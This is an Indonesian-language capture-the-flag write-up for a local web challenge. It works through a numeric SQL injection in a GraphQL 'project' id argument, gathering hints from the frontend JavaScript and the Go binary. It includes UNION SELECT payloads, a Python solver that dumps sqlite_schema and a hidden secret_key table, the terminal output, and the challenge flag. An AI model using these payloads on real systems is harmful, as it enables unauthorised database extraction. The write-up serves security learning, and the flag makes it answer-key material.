# WriteUp - Project Beta 2

## Overview

* **Judul:** Project Beta 2
* **Kategori:** Input Injection
* **Poin:** 25
* **Deskripsi:** Information leak.
* **Author:** -
* **URL:** `http://localhost:1337`

## Attachment Information & Directory Structure

Pemeriksaan struktur direktori dan file di dalam container Docker.

```bash
▶  docker exec projectbeta2-web-1 ls -la
total 13584
drwxr-xr-x    1 root     root          4096 Feb 15 06:29 .
drwxr-xr-x    1 root     root          4096 Feb 15 06:29 ..
-rwxr-xr-x    1 root     root      13896881 Feb  9 11:40 main
drwxr-xr-x    2 root     root          4096 Feb  9 11:13 static

▶  docker exec projectbeta2-web-1 ls -la static
total 28
drwxr-xr-x    2 root     root          4096 Feb  9 11:13 .
drwxr-xr-x    1 root     root          4096 Feb 15 06:29 ..
-rw-r--r--    1 root     root          3538 Feb  9 10:41 app.js
-rw-r--r--    1 root     root          8236 Feb  9 11:13 index.html
-rw-r--r--    1 root     root          2106 Feb  9 10:42 style.css

```

## Reconnaissance

### Source Code Analysis (Frontend)

Pada file `static/app.js`, ditemukan sebuah komentar eksplisit dari developer yang memberikan petunjuk mengenai kerentanan pada backend. Aplikasi menggunakan GraphQL untuk mengambil detail proyek.

```javascript
▶  docker exec projectbeta2-web-1 cat static/app.js
// ... [kode javascript] ...
// Fetch single project details
async function fetchProjectDetails(id) {
    // We explicitly request fields based on the schema
    // The vulnerability is in the backend, not dependent on the frontend query structure,
    // but the backend concatenates the ID directly.
    const query = `
        query {
            project(id: "${id}") {
                id
                name
                description
            }
        }
    `;
// ... [kode javascript] ...

```

Komentar "the backend concatenates the ID directly" mengindikasikan adanya celah SQL Injection karena parameter `id` tidak disanitasi menggunakan *prepared statements*.

### Binary Analysis (Backend)

Backend berupa file executable Go statis bernama `main`.

```bash
▶  docker exec projectbeta2-web-1 pwd
/app

▶  docker cp projectbeta2-web-1:app/main main
Successfully copied 13.9MB to /home/wanzkey/Pwn The Website/Input Injection/Project Beta 2/main

▶  file main
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=QZRO_LxijsuJWCjka2A2/O3QpQ9M9KVxiWAZ5IDje/FygMnAc8xrA3yH93i-il/92i_5KDIQ_wpEfWweeNy, with debug_info, not stripped

▶  checksec --file=main
[*] '/home/wanzkey/Pwn The Website/Input Injection/Project Beta 2/main'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes

```

Mengekstrak simbol fungsi dan memori menggunakan `nm` dan GDB untuk mengonfirmasi interaksi database:

```bash
▶  nm main | grep "main"
00000000005b5040 T crypto/x509.domainToReverseLabels
00000000005b5740 T crypto/x509.matchDomainConstraint
00000000009e6260 R go:itab.vendor/golang.org/x/net/http/httpproxy.domainMatch,vendor/golang.org/x/net/http/httpproxy.matcher
0000000000cf2d20 B main.db
0000000000898ba0 T main.initDB
0000000000caad40 D main..inittask
0000000000898e20 T main.main
0000000000899ce0 T main.main.func1
000000000089a000 T main.main.func1.1
000000000089a060 T main.main.func2
000000000089a3c0 T main.main.func2.1
000000000089a420 T main.main.func3
00000000008998a0 T main.main.func4
0000000000899c80 T main.main.func5
0000000000727ac0 T modernc.org/sqlite/lib.Xsqlite3_backup_remaining
000000000064d780 T net/http.(*body).bodyRemains
000000000064d860 T net/http.(*body).bodyRemains.func1
0000000000646360 T net/http.requestBodyRemains
0000000000580be0 T net.isDomainName
0000000000436b40 T runtime.main
000000000045eae0 T runtime.main.func1
0000000000436e80 T runtime.main.func2
0000000000cf30c0 B runtime.main_init_done
00000000009e3d98 R runtime.mainPC
0000000000d23b46 B runtime.mainStarted
000000000089a440 T type:.eq.main.Project
000000000061a300 T type:.eq.vendor/golang.org/x/net/http/httpproxy.domainMatch
000000000061a680 T vendor/golang.org/x/net/http/httpproxy.(*domainMatch).match
0000000000619fe0 T vendor/golang.org/x/net/http/httpproxy.domainMatch.match

▶  gdb -nx -batch -ex "file main" -ex "p 'main.db'"
warning: Missing auto-load script at offset 0 in section .debug_gdb_scripts
of file /home/wanzkey/Pwn The Website/Input Injection/Project Beta 2/main.
Use `info auto-load python-scripts [REGEXP]' to list them.
$1 = (database/sql.DB *) 0x0

```

Dari simbol `main.db`, `main.initDB`, dan `modernc.org/sqlite`, dipastikan aplikasi menggunakan database SQLite dan berinteraksi melalui *package* standar `database/sql`. Disassembly dari handler (seperti `main.main.func2` dan sub-fungsinya) menunjukkan penggunaan `fmt.Sprintf` untuk merakit query SQL (concatenation) yang kemudian dieksekusi via `database/sql.(*DB).QueryContext`.

## Vulnerability Analysis

Kerentanan yang dieksploitasi adalah **SQL Injection (SQLi) via GraphQL Argument**.
Aplikasi backend mengonstruksi query SQL dengan cara menggabungkan (concatenate) input `id` langsung ke dalam *statement* SQL tanpa menggunakan *parameterized queries/prepared statements*.
Meskipun frontend GraphQL membungkus argumen dalam kutip ganda (`id: "..."`), kode backend Go tidak menggunakan tanda kutip ketika memasukkan variabel ke dalam query SQL (contoh: `SELECT ... WHERE id = %s`).
Selain itu, resolver GraphQL didesain untuk mereturn satu objek (baris pertama) dari *result set*.

## Exploitation

### Bypass Syntax Error

Menyuntikkan tanda kutip tunggal (`'`) pada argumen GraphQL (`id: "1' UNION..."`) menyebabkan *syntax error* pada SQLite karena backend Go tidak menggunakan tanda kutip untuk mengapit input pada query aslinya. Solusinya adalah menghapus tanda kutip tunggal pada payload, menjadi `1 UNION SELECT '1', '2', '3'`.

### Bypass First-Row Limit

Karena resolver GraphQL hanya mengembalikan baris pertama dari tabel hasil eksekusi, menggunakan `id = 1` akan mengembalikan data proyek aslinya (misal: "Project Alpha") dan menutupi hasil injeksi `UNION`. Untuk mengakalinya, digunakan ID yang tidak ada di database (`id = -1`), sehingga baris pertama menjadi hasil dari eksekusi `UNION SELECT`.

### Ekstraksi Skema dan Flag

Setelah limitasi di-bypass, tabel `sqlite_schema` diekstrak untuk menemukan nama tabel rahasia. Ditemukan tabel `secret_key` dengan kolom `value`. Injeksi terakhir digunakan untuk melakukan *dump* terhadap kolom tersebut.

### Script Solver (`exploit.py`)

```python
import requests
import json
import re

TARGET_URL = "http://localhost:1337/graphql"

def send_query(id_payload):
    query = f"""
    query {{
        project(id: "{id_payload}") {{
            id
            name
            description
        }}
    }}
    """
    
    response = requests.post(TARGET_URL, json={'query': query})
    return response.json()

def exploit():
    print("[*] Bypassing first-row limit with id = -1...")

    print("[*] Extracting hidden table schema...")
    schema_payload = "-1 UNION SELECT '1', name, sql FROM sqlite_schema WHERE type='table' AND name != 'projects'"
    res_schema = send_query(schema_payload)
    
    project_data = res_schema.get('data', {}).get('project')
    
    if not project_data:
        print("[-] Gagal mengekstrak skema. Cek respon:")
        print(res_schema)
        return
        
    hidden_table = project_data.get('name')
    table_sql = project_data.get('description')
    
    print(f"[+] Hidden Table Found: {hidden_table}")
    print(f"[+] Table Schema: {table_sql}")
    
    columns = re.findall(r'([a-zA-Z0-9_]+)\s+(?:TEXT|VARCHAR|INTEGER|String)', table_sql, re.IGNORECASE)
    
    if len(columns) > 0:
        flag_column = columns[-1]
        print(f"[*] Targeting column '{flag_column}' to extract the flag...")
        
        dump_payload = f"-1 UNION SELECT '1', '2', {flag_column} FROM {hidden_table} LIMIT 1"
        res_flag = send_query(dump_payload)
        
        flag = res_flag.get('data', {}).get('project', {}).get('description')
        
        print("\n" + "="*40)
        print("[+] PWNED! Flag Extracted:")
        print(flag)
        print("="*40 + "\n")
    else:
        print("[-] Gagal nge-parse nama kolom. Silakan cek skema tabel secara manual bro!")

if __name__ == "__main__":
    exploit()

```

### Output Terminal

```bash
▶  ./exploit.py
[*] Bypassing first-row limit with id = -1...
[*] Extracting hidden table schema...
[+] Hidden Table Found: secret_key
[+] Table Schema: CREATE TABLE secret_key (id text, value text)
[*] Targeting column 'value' to extract the flag...

========================================
[+] PWNED! Flag Extracted:
pwn{d408e8c6d534f865907914fe92334e7a}
========================================

```

## Flag

```
pwn{d408e8c6d534f865907914fe92334e7a}

```
